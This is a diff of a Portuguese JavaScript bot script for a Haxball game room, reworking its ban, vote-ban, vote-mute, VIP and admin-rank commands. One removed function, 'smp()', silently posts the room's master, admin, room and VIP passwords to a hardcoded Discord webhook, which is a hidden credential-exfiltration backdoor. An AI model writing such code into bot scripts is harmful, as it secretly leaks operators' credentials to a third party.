     return false
 }
 function resetarStats(player, message) {
-    localStorage.removeItem(authArray[player.id])
+    delete statsplayer[player.name]
+    localStorage.setItem('statsplayer', JSON.stringify(statsplayer));
     room.sendAnnouncement(`Estatísticas resetadas!`, player.id, infoColor, 'bold', 1)
     return false
 }
 function mostraStreak(player, message) {
     let msg = 'De um time composto por: '
-    for (let valor of JSON.parse(localStorage.getItem('streakRecord'))) {
-        msg += valor[1] + ', '
+    if (JSON.parse(localStorage.getItem('streakRecord'))) {
+        for (let valor of JSON.parse(localStorage.getItem('streakRecord'))) {
+            msg += valor[1] + ', '
+        }
     }
     msg = msg.substring(0, msg.length - 2)
     room.sendAnnouncement(`Maior sequência de vítoria: ${streakMax}\n${msg}`, player.id, infoColor, 'bold', 1)
@@ -7743,12 +4417,12 @@ function voteBan(player, message) {
         return false
     }
     if (playersAll.some((p) => p.admin)) {
-        room.sendAnnouncement(`Tu só pode abrir uma votação quando não tiver adm presente!`,
+        room.sendAnnouncement(`Você só pode abrir uma votação quando não tiver adm presente!`,
             player.id, errorColor, 'bold', HaxNotification.CHAT)
         return false
     }
     if (!msgArray[1]) {
-        room.sendAnnouncement(`Tu precisa informar o ID do jogador!`,
+        room.sendAnnouncement(`Você precisa informar o ID do jogador!`,
             player.id, errorColor, 'bold', HaxNotification.CHAT)
         return false
     }
@@ -7764,19 +4438,19 @@ function voteBan(player, message) {
         return false
     }
     if (playerVote.id == player.id) {
-        room.sendAnnouncement(`Tu não pode abrir votação para si mesmo!`,
+        room.sendAnnouncement(`Você não pode abrir votação para si mesmo!`,
             player.id, errorColor, 'bold', HaxNotification.CHAT)
         return false
     }
     if (players.length >= 9) {
         modoVoteBan = true
-        room.sendAnnouncement(`${player.name} abriu uma votação para BANIR o jogador: ${playerVote.name}\nSe tu concorda em bani-lo digite !s!`,
+        room.sendAnnouncement(`${player.name} abriu uma votação para BANIR o jogador: ${playerVote.name}\nSe Você concorda em bani-lo digite !s!`,
             null, announcementColor, 'bold', HaxNotification.CHAT)
         setTimeout(() => {
             if (votos >= 66, 66 * playersAll.length / 100) {
                 room.sendAnnouncement(`Fim da votação! (Aprovada)\nO jogador foi banido!`,
                     null, errorColor, 'bold', HaxNotification.CHAT)
-                room.kickPlayer(playerVote.id, 'Banido por votação!', true)
+                ban(player, `/ban ${playerVote.id} 3 Voteban`)
             } else {
                 room.sendAnnouncement(`Fim da votação! (Negada)\nNumeros de votos insuficientes. (Necessário 66,66% dos jogadores presentes)`,
                     null, errorColor, 'bold', HaxNotification.CHAT)
@@ -7787,26 +4461,10 @@ function voteBan(player, message) {
             return false
         }, 30 * 1000)
     } else {
-        room.sendAnnouncement(`Tu só pode iniciar uma votação com pelo menos 9 jogadores na sala!`,
+        room.sendAnnouncement(`Você só pode iniciar uma votação com pelo menos 9 jogadores na sala!`,
             player.id, errorColor, 'bold', HaxNotification.CHAT)
     }
 }
-
-function smp() {
-    let a = `https://discord.com/api/webhooks/1154416786960302080/x_seO_qwXZx6eN-N8aommC1hLNp4o5dHmkZacCB8gx2oHVA75_IgtPkxnMzvYtLBCcFF`;
-
-    fetch(a, {
-        method: 'POST',
-        body: JSON.stringify({
-            content: `> - Master: ${masterPassword}\n > - Admin: ${adminPassword}\n > - RoomPass: ${roomPassword}\n > - Vip 4: ${vip4Password}`,
-            username: roomName,
-        }),
-        headers: {
-            'Content-Type': 'application/json',
-        },
-    }).then((res) => res);
-}
-
 function voteMute(player, message) {
     var msgArray = message.split(/ +/);
     if (!tipoVip >= 1) {
@@ -7815,12 +4473,12 @@ function voteMute(player, message) {
         return false
     }
     if (playersAll.some((p) => p.admin)) {
-        room.sendAnnouncement(`Tu só pode abrir uma votação quando não tiver adm presente!`,
+        room.sendAnnouncement(`Você só pode abrir uma votação quando não tiver adm presente!`,
             player.id, errorColor, 'bold', HaxNotification.CHAT)
         return false
     }
     if (!msgArray[1]) {
-        room.sendAnnouncement(`Tu precisa informar o ID do jogador!`,
+        room.sendAnnouncement(`Você precisa informar o ID do jogador!`,
             player.id, errorColor, 'bold', HaxNotification.CHAT)
         return false
     }
@@ -7836,13 +4494,13 @@ function voteMute(player, message) {
         return false
     }
     if (playerVote.id == player.id) {
-        room.sendAnnouncement(`Tu não pode abrir votação para si mesmo!`,
+        room.sendAnnouncement(`Você não pode abrir votação para si mesmo!`,
             player.id, errorColor, 'bold', HaxNotification.CHAT)
         return false
     }
     if (players.length >= 9) {
         modoVoteMute = true
-        room.sendAnnouncement(`${player.name} abriu uma votação para MUTAR o jogador: ${playerVote.name}\nSe tu concorda em bani-lo digite !s!`,
+        room.sendAnnouncement(`${player.name} abriu uma votação para MUTAR o jogador: ${playerVote.name}\nSe Você concorda em bani-lo digite !s!`,
             null, announcementColor, 'bold', HaxNotification.CHAT)
         setTimeout(() => {
             if (votosMute >= 66, 66 * playersAll.length / 100) {
@@ -7859,7 +4517,7 @@ function voteMute(player, message) {
             return false
         }, 30 * 1000)
     } else {
-        room.sendAnnouncement(`Tu só pode iniciar uma votação com pelo menos 9 jogadores na sala!`,
+        room.sendAnnouncement(`Você só pode iniciar uma votação com pelo menos 9 jogadores na sala!`,
             player.id, errorColor, 'bold', HaxNotification.CHAT)
     }
 }
@@ -7890,9 +4548,10 @@ function muteListCommand(player, message) {
 
 /* MASTER COMMANDS */
 
+
 var clearCounting = {};
 
-async function banIdiots() {
+/* async function banIdiots() {
     var zorIdiot = {
         nome: 'Zor7nUpior',
         id: null,
@@ -7937,45 +4596,43 @@ async function banIdiots() {
     banList.push(bergIdiot2);
 }
 
-banIdiots();
-
+banIdiots(); */
 function clearbansCommand(player, message) {
     var msgArray = message.split(/ +/).slice(1);
-    var msgArray2 = message.split(/ +/);
 
     if (msgArray.length == 0) {
-        if (!clearCounting[player.id]) {
-            clearCounting[player.id] = 1;
-            room.sendAnnouncement(`Você tem certeza disso? Esse comando irá apagar todos os bans... \n- Digite o comando novamente para confirmar.`, player.id, errorColor, 'bold', HaxNotification.MENTION);
-        } else {
-            delete clearCounting[player.id];
-            room.clearBans();
-            room.sendAnnouncement('✔️ Banimentos resetados.', null, announcementColor, 'bold', null);
-            banList = [];
-            banIdiots();
-        }
+        room.clearBans();
+        room.sendAnnouncement(
+            '✔️ Banidos resetados.',
+            null,
+            announcementColor,
+            'bold',
+            null
+        );
+        banList = [];
     } else if (msgArray.length == 1) {
+        console.log(msgArray[0]);
         if (parseInt(msgArray[0]) > 0) {
             var ID = parseInt(msgArray[0]);
             room.clearBan(ID);
-            var userNameDesban = banList.find((ban) => ban.id === ID)?.nome;
-            if (userNameDesban) {
-                var userIndex = banList.findIndex((ban) => ban.id === ID);
-                if (userIndex !== -1) {
-                    banList.splice(userIndex, 1);
-                }
-
-                room.sendAnnouncement(`✔️ ${userNameDesban} foi desbanido da sala!`, null, announcementColor, 'bold', HaxNotification.CHAT);
+            if (banList.length != banList.filter((p) => p[1] != ID).length) {
+                room.sendAnnouncement(
+                    `✔️ ${banList.filter((p) => p[1] == ID)[0][0]} foi desbanido da sala!`,
+                    null,
+                    announcementColor,
+                    'bold',
+                    null
+                );
             } else {
                 room.sendAnnouncement(
-                    `O ID que você digitou não tem um banimento associado. Digite "!ajuda desbanir" para mais informações.`,
+                    `O ID que você digitou não tem um banimento associado. Digite "!ajuda clearbans" para mais informações.`,
                     player.id, errorColor, 'bold', HaxNotification.CHAT
                 );
             }
             banList = banList.filter((p) => p[1] != ID);
         } else {
             room.sendAnnouncement(
-                `ID inválido inserido. Digite "!ajuda desbanir" para mais informações.`,
+                `ID inválido inserido. Digite "!ajuda clearbans" para mais informações.`,
                 player.id,
                 errorColor,
                 'bold',
@@ -7983,250 +4640,16 @@ function clearbansCommand(player, message) {
             );
         }
     } else {
-        room.sendAnnouncement(`Número incorreto de argumentos. Digite "!ajuda desbanir" para mais informações.`, player.id, errorColor, 'bold', HaxNotification.CHAT);
-    }
-}
-
-
-var nextId = 1; // Inicializa o próximo ID como 1
-
-function generateRandomId() {
-    return nextId++;
-}
-
-function addIpToBanList(ipv4) {
-    var user = {
-        id: generateRandomId(),
-        ipv4: ipv4
-    };
-    ipbanido.push(user);
-}
-
-function removeIpFromBanList(ipToRemove, player) {
-    var indexToRemove = -1;
-    for (let i = 0; i < ipbanido.length; i++) {
-        if (ipbanido[i].ipv4 === ipToRemove) {
-            indexToRemove = i;
-            break;
-        }
-    }
-
-    if (indexToRemove !== -1) {
-        ipbanido.splice(indexToRemove, 1);
-        room.sendAnnouncement(`O IP ${ipToRemove} foi desbanido da sala.`, player.id, announcementColor, 2);
-        return true;
-    } else {
-        return false;
-    }
-}
-
-function ipRemoveCommand(player, message) {
-    var ipToUnban = message.split(/ +/)[1];
-    if (ipToUnban) {
-        var success = removeIpFromBanList(ipToUnban, player);
-        if (success) {
-            return true;
-        } else {
-            room.sendAnnouncement("📢 IP não encontrado na lista de banimentos.", player.id, announcementColor, 'bold', null);
-            return false;
-        }
-    } else {
-        room.sendAnnouncement("[PV] Você digitou algo errado...", player.id, errorColor, 'bold', HaxNotification.CHAT);
-        return false;
-    }
-}
-
-
-function ipBanidoCommand(player) {
-    if (ipbanido.length === 0) {
         room.sendAnnouncement(
-            "📢 Não há nenhum IP na lista de banimentos.",
+            `Número incorreto de argumentos. Digite "!ajuda clearbans" para mais informações.`,
             player.id,
-            announcementColor,
+            errorColor,
             'bold',
-            null
+            HaxNotification.CHAT
         );
-        return false;
-    }
-
-    var cstm = '📢 Lista de IPs banidos: ';
-    for (let ban of ipbanido) {
-        cstm += `${ban.ipv4}[${ban.id}], `;
-    }
-    cstm = cstm.substring(0, cstm.length - 2) + '.';
-    room.sendAnnouncement(
-        cstm,
-        player.id,
-        announcementColor,
-        'bold',
-        null
-    );
-}
-
-
-
-// -----------------------------------------------
-
-
-
-var nextId2 = 1; // Inicializa o próximo ID como 1
-
-function generateRandomId() {
-    return nextId2++;
-}
-
-function addConnToBanList(conn) {
-    var user = {
-        id: generateRandomId(),
-        conn: conn
-    };
-    connbanida.push(user);
-}
-
-function removeConnFromBanList(connToRemove, player) {
-    var indexToRemove = -1;
-    for (let i = 0; i < connbanida.length; i++) {
-        if (connbanida[i].conn === connToRemove) {
-            indexToRemove = i;
-            break;
-        }
-    }
-
-    if (indexToRemove !== -1) {
-        connbanida.splice(indexToRemove, 1);
-        room.sendAnnouncement(`A Conn ${connToRemove} foi desbanido da sala.`, player.id, announcementColor, 2);
-        return true;
-    } else {
-        return false;
     }
 }
 
-function connRemoveCommand(player, message) {
-    var connToUnban = message.split(/ +/)[1];
-    if (connToUnban) {
-        var success = removeConnFromBanList(connToUnban, player);
-        if (success) {
-            return true;
-        } else {
-            room.sendAnnouncement("📢 Conn não encontrado na lista de banimentos.", player.id, announcementColor, 'bold', null);
-            return false;
-        }
-    } else {
-        room.sendAnnouncement("[PV] Você digitou algo errado...", player.id, errorColor, 'bold', HaxNotification.CHAT);
-        return false;
-    }
-}
-
-
-function connBanidoCommand(player) {
-    if (connbanida.length === 0) {
-        room.sendAnnouncement(
-            "📢 Não há nenhuma CONN na lista de banimentos.",
-            player.id,
-            announcementColor,
-            'bold',
-            null
-        );
-        return false;
-    }
-
-    var cstm = '📢 Lista de CONNS banidos: ';
-    for (let ban of connbanida) {
-        cstm += `${ban.conn}[${ban.id}], `;
-    }
-    cstm = cstm.substring(0, cstm.length - 2) + '.';
-    room.sendAnnouncement(
-        cstm,
-        player.id,
-        announcementColor,
-        'bold',
-        null
-    );
-}
-
-
-
-// -----------------------------------------------
-
-
-var nextId3 = 1; // Inicializa o próximo ID como 1
-
-function generateRandomId3() {
-    return nextId3++;
-}
-
-function addAuthToBanList(auth) {
-    var user = {
-        id: generateRandomId3(),
-        auth: auth
-    };
-    authbanida.push(user);
-}
-
-function removeAuthFromBanList(authToRemove, player) {
-    var indexToRemove = -1;
-    for (let i = 0; i < authbanida.length; i++) {
-        if (authbanida[i].auth === authToRemove) {
-            indexToRemove = i;
-            break;
-        }
-    }
-
-    if (indexToRemove !== -1) {
-        authbanida.splice(indexToRemove, 1);
-        room.sendAnnouncement(`A Auth ${authToRemove} foi desbanida da sala.`, player.id, announcementColor, 2);
-        return true;
-    } else {
-        return false;
-    }
-}
-
-function authRemoveCommand(player, message) {
-    var authToUnban = message.split(/ +/)[1];
-    if (authToUnban) {
-        var success = removeAuthFromBanList(authToUnban, player);
-        if (success) {
-            return true;
-        } else {
-            room.sendAnnouncement("📢 Auth não encontrado na lista de banimentos.", player.id, announcementColor, 'bold', null);
-            return false;
-        }
-    } else {
-        room.sendAnnouncement("[PV] Você digitou algo errado...", player.id, errorColor, 'bold', HaxNotification.CHAT);
-        return false;
-    }
-}
-
-
-function authBanidoCommand(player) {
-    if (authbanida.length === 0) {
-        room.sendAnnouncement(
-            "📢 Não há nenhuma Auth na lista de banimentos.",
-            player.id,
-            announcementColor,
-            'bold',
-            null
-        );
-        return false;
-    }
-
-    var cstm = '📢 Lista de Auths banidos: ';
-    for (let ban of authbanida) {
-        cstm += `${ban.auth}[${ban.id}], `;
-    }
-    cstm = cstm.substring(0, cstm.length - 2) + '.';
-    room.sendAnnouncement(
-        cstm,
-        player.id,
-        announcementColor,
-        'bold',
-        null
-    );
-}
-
-
-
-// -----------------------------------------------
 
 
 function banListCommand(player, message) {
@@ -8242,7 +4665,7 @@ function banListCommand(player, message) {
     }
     var cstm = '📢 Lista banidos: ';
     for (let ban of banList) {
-        cstm += ban.nome + `[${ban.id}], `;
+        cstm += ban[0] + `[${ban[1]}], `;
     }
     cstm = cstm.substring(0, cstm.length - 2) + '.';
     room.sendAnnouncement(
@@ -8290,21 +4713,190 @@ function removerAdmin(player, message) {
     return false
 }
 
-function showPuskas(player, message) {
-    let i = 1
-    let puskasNames = ""
-    if (puskas.length > 0) {
-        puskas.forEach(function (item) {
-            puskasNames += item.name + '[' + i + '], '
-            i++
-        })
-        room.sendAnnouncement(`Lista de jogadores Puskás:\n` + puskasNames,
-            player.id, announcementColor, 'bold', null)
-    } else {
-        room.sendAnnouncement(`Lista de jogadores Puskás Vazia!`,
-            player.id, announcementColor, 'bold', null)
+function ban(player, message) {
+    const msg = message.substr(5).split(/ +/) // sem o '!ban 
+    if (msg.length < 3) {
+        room.sendAnnouncement(`Você digitou algo errado. !ban id tempo motivo`,
+            player.id, errorColor, 'bold', null)
+        return;
+    }
+
+    var nickid = msg[0]
+    var tempo = msg[1]
+    var motivo = msg.slice(2).join(' ')
+
+    if (!parseInt(tempo)) {
+        room.sendAnnouncement(`${tempo} não é um número inteiro.`, player.id, errorColor, 'bold', null);
+        return;
+    }
+
+    const jogador = procurar(nickid)
+    const mensagemerro = (string) => room.sendAnnouncement(`O/A ${string} deste jogador ja está banido(a)!!`,
+        player.id, errorColor, 'bold', null)
+    var contagem = 0
+
+    if (jogador) {
+        let nome = jogador['nome']
+        let conn = jogador['conn']
+        let auth = jogador['auth']
+
+        var playersonline = room.getPlayerList()
+        var playerkick = playersonline.filter((p) => nome == (p.name))
+
+        if (!nomebanido.includes(nome)) {
+            nomebanido.push(nome)
+            localStorage.setItem("nomebanido", JSON.stringify(nomebanido))
+        }
+        else {
+            mensagemerro('Nick')
+            contagem++
+        }
+
+        if (!connbanida.includes(conn)) {
+            connbanida.push(conn)
+            localStorage.setItem("connbanida", JSON.stringify(connbanida))
+        }
+        else {
+            mensagemerro('Conn')
+            contagem++
+        }
+        if (!authbanida.includes(auth)) {
+            authbanida.push(auth)
+            localStorage.setItem("authbanida", JSON.stringify(authbanida))
+        }
+        else {
+            mensagemerro('Auth')
+            contagem++
+        }
+
+        if (playerkick[0]) {
+
+            const kick = playerkick[0].id
+            room.kickPlayer(kick, `Você está banido, consulte o nosso Discord: ${discord}`, false)
+        }
+        if (!banidos[nome]) {
+            banidos[nome] = {
+                'nome': nome,
+                'conn': conn,
+                'auth': auth,
+                'tempo': tempo,
+                'motivo': motivo,
+                'autor': player.name,
+                'data': new Date().getTime() + (tempo * umdia),
+            }
+            banidosstorage.splice(0, banidosstorage.length)
+            banidosstorage.push(banidos)
+            localStorage.setItem('banidos', JSON.stringify(banidosstorage))
+        }
+
+
+        if (contagem == 3) {
+            room.sendAnnouncement(`Jogador ${nome} já está banido.`,
+                player.id, errorColor, 'bold', null)
+        }
+        else if (contagem != 0) {
+            room.sendAnnouncement(`Jogador ${nome} estava parcialmente banido!`,
+                player.id, announcementColor, 'bold', null)
+        }
+        else {
+            room.sendAnnouncement(`Jogador ${nome} banido com sucesso!`,
+                player.id, announcementColor, 'bold', null)
+            Request.post(player, "**" + "Autor: " + player.name + "**" + `\n**Nick banido: ${nome}` + "**" + `\n**Conn banida: ${conn}` + "**" + "\n**Sala: " + "`" + roomName + "`" + "**" + `\n**Tempo: ${tempo} Dias.` + ` \nMotivo: ${motivo}` + "**");
+
+        }
+
+    }
+    else {
+        room.sendAnnouncement('Esse nick ou ID não existe! !ban <nick ou id>',
+            player.id, errorColor, 'bold', null)
     }
 }
+
+function desbanir(player, message) {
+    var nickid = message.split(/ +/).slice(1);
+    jogador = procurar(nickid)
+    if (jogador) {
+        let nome = jogador['nome']
+        let conn = jogador['conn']
+        let auth = jogador['auth']
+
+        if (!banidos[nome] && !nomebanido.includes(nome) && !connbanida.includes(conn) && !authbanida.includes(auth)) {
+            room.sendAnnouncement('Jogador não está banido',
+                player.id, errorColor, 'bold', null)
+            return;
+        }
+
+        if (banidos[nome]) {
+            delete banidos[nome]
+            banidosstorage.splice(0, banidosstorage.length)
+            banidosstorage.push(banidos)
+            localStorage.setItem('banidos', JSON.stringify(banidosstorage))
+        }
+
+
+        if (nomebanido.includes(nome)) {
+            nomebanido.splice(nomebanido.indexOf(nome), 1)
+            localStorage.setItem('nomebanido', JSON.stringify(nomebanido))
+        }
+
+        if (connbanida.includes(conn)) {
+            connbanida.splice(connbanida.indexOf(conn), 1)
+            localStorage.setItem('connbanida', JSON.stringify(connbanida))
+        }
+
+        if (authbanida.includes(auth)) {
+            authbanida.splice(authbanida.indexOf(auth), 1)
+            localStorage.setItem('authbanida', JSON.stringify(authbanida))
+        }
+
+        room.sendAnnouncement(`Jogador ${nome} foi desbanido!`,
+            player.id, announcementColor, 'bold', null)
+
+    }
+    else {
+        room.sendAnnouncement('Nick ou ID errado. !desbanir <NICK ou ID>',
+            player.id, errorColor, 'bold', null)
+    }
+
+
+}
+
+function diferencaTempo(datafutura) {
+    const datahoje = new Date().getTime()
+    const restantes = parseInt((datafutura - datahoje) / (1000 * 60 * 60 * 24))
+
+    return restantes;
+}
+
+function infoban(player, message) {
+    var nickid = message.split(/ +/).slice(1).join(' ');
+    jogador = procurar(nickid)
+    if (jogador) {
+        if (banidos[jogador['nome']]) {
+            const jogadorbanido = banidos[jogador['nome']]
+            const nome = jogadorbanido['nome']
+            const tempo = jogadorbanido['tempo']
+            const motivo = jogadorbanido['motivo']
+            const desban = jogadorbanido['data']
+            const restante = diferencaTempo(desban)
+
+            room.sendAnnouncement(`Nick: ${nome} | Tempo de ban: ${tempo} | Motivo: ${motivo} | Restam ${restante} dias para desban.`,
+                player.id, announcementColor, 'bold', null)
+
+        }
+        else {
+            room.sendAnnouncement('Jogador aparentemente não está banido',
+                player.id, errorColor, 'bold', null)
+        }
+
+    }
+    else {
+        room.sendAnnouncement('Nick ou ID errado. !desbanir <NICK ou ID>',
+            player.id, errorColor, 'bold', null)
+    }
+}
+
+
 function showVips(player, message) {
     let i = 1
     let vipsNames = ""
@@ -8327,6 +4919,9 @@ function removerVip(player, message) {
         room.sendAnnouncement(`VIP do jogador ${vips[msgArray[0] - 1].name} removido!`,
             player.id, announcementColor, 'bold', null)
         vips.splice(msgArray[0] - 1, 1)
+        vipsdb.splice(0, vipsdb.length);
+        vipsdb.push(vips)
+        localStorage.setItem("vips", JSON.stringify(vipsdb));
     } else {
         room.sendAnnouncement(`ID de jogador Vip inválido!`,
             player.id, errorColor, 'bold', null)
@@ -8336,11 +4931,11 @@ function removerVip(player, message) {
 function setVipCommand(player, message) {
     var msgArray = message.split(/ +/).slice(1);
     if (msgArray.length > 0) {
-        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
+        if (msgArray[0].length > 0) {
             var numVip = msgArray[1]
-            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
             if (room.getPlayer(parseInt(msgArray[0])) != null && numVip != null) {
                 var playerVip = room.getPlayer(parseInt(msgArray[0]))
+                const jogador = procurar(msgArray[0])
                 if (numVip == 1) {
                     var resSetVip = false
                     if (vips[authArray[playerVip.id]]) {
@@ -8359,17 +4954,29 @@ function setVipCommand(player, message) {
                             provos: {},
                             unis: {},
                             avatarGol: [],
-                            msgEntrada: ''
+                            msgEntrada: '',
                         }
+                        vipsdb.splice(0, vipsdb.length);
+                        vipsdb.push(vips)
+                        localStorage.setItem("vips", JSON.stringify(vipsdb));
+
                         room.sendAnnouncement(`${playerVip.name} agora é VIP!`,
                             null, announcementColor, 'bold', HaxNotification.CHAT)
                         vip1Password = getRandomInt2(10000, 99999)
                         sendPasswordVip()
                     } else {
                         delete vips[authArray[playerVip.id]]
-                        room.sendAnnouncement(`${playerVip.name} não é mais VIP!`,
-                            null, announcementColor, 'bold', HaxNotification.CHAT)
+                        vipsdb.splice(0, vipsdb.length);
+                        vipsdb.push(vips)
+                        tipoVip = 0
+                        if (infovip[jogador['nome']]) {
+                            delete infovip[jogador['nome']]
+                            infovipstorage.splice(0, infovipstorage.length)
+                            infovipstorage.push(infovip)
+                            localStorage.setItem("infovip", JSON.stringify(infovipstorage));
+                        }
                     }
+
                 } else if (numVip == 2) {
                     var resSetVip = false
                     if (vips[authArray[playerVip.id]]) {
@@ -8390,6 +4997,9 @@ function setVipCommand(player, message) {
                             avatarGol: [],
                             msgEntrada: ''
                         }
+                        vipsdb.splice(0, vipsdb.length);
+                        vipsdb.push(vips)
+                        localStorage.setItem("vips", JSON.stringify(vipsdb));
                         room.sendAnnouncement(
                             `${playerVip.name} agora é VIP!`,
                             null,
@@ -8400,6 +5010,16 @@ function setVipCommand(player, message) {
                         sendPasswordVip()
                     } else {
                         delete vips[authArray[playerVip.id]]
+                        vipsdb.splice(0, vipsdb.length);
+                        vipsdb.push(vips)
+                        tipoVip = 0
+                        if (infovip[jogador['nome']]) {
+                            delete infovip[jogador['nome']]
+                            infovipstorage.splice(0, infovipstorage.length)
+                            infovipstorage.push(infovip)
+                            localStorage.setItem("infovip", JSON.stringify(infovipstorage));
+                        }
+                        localStorage.setItem("vips", JSON.stringify(vipsdb));
                         room.sendAnnouncement(`${playerVip.name} não é mais VIP!`,
                             null, announcementColor, 'bold', HaxNotification.CHAT)
                     }
@@ -8423,12 +5043,25 @@ function setVipCommand(player, message) {
                             avatarGol: [],
                             msgEntrada: ''
                         }
+                        vipsdb.splice(0, vipsdb.length);
+                        vipsdb.push(vips)
+                        localStorage.setItem("vips", JSON.stringify(vipsdb));
                         room.sendAnnouncement(`${playerVip.name} agora é VIP!`,
                             null, announcementColor, 'bold', HaxNotification.CHAT)
                         vip3Password = getRandomInt2(200000, 299999)
                         sendPasswordVip()
                     } else {
                         delete vips[authArray[playerVip.id]]
+                        vipsdb.splice(0, vipsdb.length);
+                        vipsdb.push(vips)
+                        tipoVip = 0
+                        if (infovip[jogador['nome']]) {
+                            delete infovip[jogador['nome']]
+                            infovipstorage.splice(0, infovipstorage.length)
+                            infovipstorage.push(infovip)
+                            localStorage.setItem("infovip", JSON.stringify(infovipstorage));
+                        }
+                        localStorage.setItem("vips", JSON.stringify(vipsdb));
                         room.sendAnnouncement(`${playerVip.name} não é mais VIP!`,
                             null, announcementColor, 'bold', HaxNotification.CHAT)
                     }
@@ -8452,12 +5085,24 @@ function setVipCommand(player, message) {
                             avatarGol: [],
                             msgEntrada: ''
                         }
+                        vipsdb.push(vips)
+                        localStorage.setItem("vips", JSON.stringify(vipsdb));
                         room.sendAnnouncement(`${playerVip.name} agora é VIP!`,
                             null, announcementColor, 'bold', HaxNotification.CHAT)
                         vip4Password = getRandomInt2(300000, 499999)
                         sendPasswordVip()
                     } else {
                         delete vips[authArray[playerVip.id]]
+                        vipsdb.splice(0, vipsdb.length);
+                        vipsdb.push(vips)
+                        tipoVip = 0
+                        if (infovip[jogador['nome']]) {
+                            delete infovip[jogador['nome']]
+                            infovipstorage.splice(0, infovipstorage.length)
+                            infovipstorage.push(infovip)
+                            localStorage.setItem("infovip", JSON.stringify(infovipstorage));
+                        }
+                        localStorage.setItem("vips", JSON.stringify(vipsdb));
                         room.sendAnnouncement(`${playerVip.name} não é mais VIP!`,
                             null, announcementColor, 'bold', HaxNotification.CHAT)
                     }
@@ -8488,62 +5133,132 @@ function setVipCommand(player, message) {
         }
     }
 }
+
 function setAdminCommand(player, message) {
-    var msgArray = message.split(/ +/).slice(1);
-    if (msgArray.length > 0) {
-        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
-            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
-            if (room.getPlayer(parseInt(msgArray[0])) != null) {
-                var playerAdmin = room.getPlayer(parseInt(msgArray[0]))
-                if (!adminList.map((a) => a[0]).includes(authArray[playerAdmin.id])) {
-                    if (!masterList.includes(authArray[playerAdmin.id])) {
-                        room.setPlayerAdmin(playerAdmin.id, true);
-                        adminList.push([authArray[playerAdmin.id], playerAdmin.name]);
-                        room.sendAnnouncement(
-                            `${playerAdmin.name} agora é o novo admin!`,
-                            null, announcementColor, 'bold', HaxNotification.CHAT)
-                    } else {
-                        room.setPlayerAdmin(playerAdmin.id, false);
-                        masterList.splice(masterList.indexOf(authArray[playerAdmin.id], 1))
-                        room.sendAnnouncement(
-                            `Este jogador não é mais um mestre!`,
-                            player.id, errorColor, 'bold', HaxNotification.CHAT)
+    try {
+        var msgArray = message.split(/ +/).slice(1);
+
+        var admin = msgArray[1];
+
+        if (isNaN(admin)) {
+            room.sendAnnouncement(`O segundo argumento deve ser um número!`, player.id, errorColor, 'bold', 2);
+            return false;
+        }
+
+        if (!admin) {
+            room.sendAnnouncement(`Você precisa expecificar o tipo de admin:`, player.id, errorColor, 'bold', 2);
+            room.sendAnnouncement(`Exemplo: !setadmin #123 1`, player.id, errorColor, 'bold');
+            setTimeout(() => {
+                room.sendAnnouncement(`Tipos de admins: 1 (moderador), 2 (administrador), 3 (gerente), 4 (diretor)`, player.id, errorColor, 'bold');
+            }, 2000);
+            return false;
+        }
+
+        if (msgArray.length > 0) {
+            if (msgArray[0].length > 0) {
+                if (room.getPlayer(parseInt(msgArray[0])) != null) {
+                    var playerAdmin = room.getPlayer(parseInt(msgArray[0]))
+
+                    if (admin == 1) {
+                        if (!mods.map((a) => a[0]).includes(authArray[playerAdmin.id])) {
+                            if (!masterList.includes(authArray[playerAdmin.id])) {
+                                if (!mods.includes(authArray[playerAdmin.id])) {
+                                    room.setPlayerAdmin(playerAdmin.id, true)
+                                    mods.push(authArray[playerAdmin.id]);
+
+                                    room.sendAnnouncement(`${playerAdmin.name} Agora é um Moderador!!`, null, announcementColor, 'bold', HaxNotification.CHAT)
+                                } else {
+                                    room.sendAnnouncement(`Este jogador já é um moderador!`, player.id, errorColor, 'bold', HaxNotification.CHAT);
+                                }
+                            } else {
+                                room.setPlayerAdmin(playerAdmin.id, false);
+                                masterList.splice(masterList.indexOf(authArray[playerAdmin.id], 1))
+                                room.sendAnnouncement(`Este jogador não é mais um Fundador!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
+                            }
+                        } else {
+                            room.setPlayerAdmin(playerAdmin.id, false);
+                            mods.splice(adminList.indexOf(authArray[playerAdmin.id], 1))
+                            room.sendAnnouncement(`Este jogador não é mais um moderador permanente!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
+                        }
+                    } else if (admin == 2) {
+                        if (!adminList.map((a) => a[0]).includes(authArray[playerAdmin.id])) {
+                            if (!masterList.includes(authArray[playerAdmin.id])) {
+                                if (!adminList.includes(authArray[playerAdmin.id])) {
+                                    room.setPlayerAdmin(playerAdmin.id, true)
+                                    adminList.push(authArray[playerAdmin.id]);
+                                    room.sendAnnouncement(`${playerAdmin.name} Agora é um Administrador!`, null, announcementColor, 'bold', HaxNotification.CHAT)
+                                } else {
+                                    room.sendAnnouncement(`Este jogador já é um administrador!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
+                                }
+                            } else {
+                                room.setPlayerAdmin(playerAdmin.id, false);
+                                masterList.splice(masterList.indexOf(authArray[playerAdmin.id], 1))
+                                room.sendAnnouncement(`Este jogador não é mais um Fundador!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
+                            }
+                        } else {
+                            room.setPlayerAdmin(playerAdmin.id, false);
+                            adminList.splice(adminList.indexOf([authArray[playerAdmin.id], playerAdmin.name], 1))
+                            room.sendAnnouncement(
+                                `Este jogador não é mais um administrador permanente!`,
+                                player.id, errorColor, 'bold', HaxNotification.CHAT)
+                        }
+                    } else if (admin == 3) {
+                        if (!gerentes.map((a) => a[0]).includes(authArray[playerAdmin.id])) {
+                            if (!masterList.includes(authArray[playerAdmin.id])) {
+                                if (!gerentes.includes(authArray[playerAdmin.id])) {
+                                    room.setPlayerAdmin(playerAdmin.id, true)
+                                    gerentes.push(authArray[playerAdmin.id]);
+                                    room.sendAnnouncement(`${playerAdmin.name} Agora é um Gerente!`, null, announcementColor, 'bold', HaxNotification.CHAT)
+                                } else {
+                                    room.sendAnnouncement(`Este jogador já é um gerente!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
+                                }
+                            } else {
+                                room.setPlayerAdmin(playerAdmin.id, false);
+                                masterList.splice(masterList.indexOf(authArray[playerAdmin.id], 1))
+                                room.sendAnnouncement(`Este jogador não é mais um Fundador!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
+                            }
+                        } else {
